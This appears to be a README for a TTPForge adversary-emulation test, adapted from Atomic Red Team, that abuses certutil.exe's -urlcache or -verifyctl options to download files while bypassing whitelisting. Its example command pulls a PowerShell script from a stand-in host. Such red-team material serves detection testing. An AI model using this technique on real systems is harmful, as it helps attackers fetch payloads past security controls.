# certutil download (urlcache)

## Description
Abuses certutil.exe to download files using -urlcache or -verifyctl arguments. This signed Microsoft binary bypasses application whitelisting controls and evades detection.

Adapted from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)

## Arguments
- **method**: Method to use for download (urlcache, verifyctl) (default: `urlcache`)
- **remote_file**: URL of file to copy (default: `https://raw.githubusercontent.com/redcanaryco/atomic-red-team/dd526047b8c399c312fee47d1e6fb531164da54d/LICENSE.txt`)
- **local_file**: Local path to place file (default: `C:\Users\Public\malicious.bin`)

## Example(s)
You can run this TTP with the following command:
```bash
ttpforge run forgearmory//command-and-control/download-using-certutil/ttp.yaml \
  --method "verifyctl" \
  --remote_file "https://example.com/tool.ps1" \
  --local_file "C:\Temp\script.ps1"
```

## Steps
1. **download_file_with_certutil**: Downloads a file using certutil with either the -urlcache or -verifyctl method based on the specified argument.
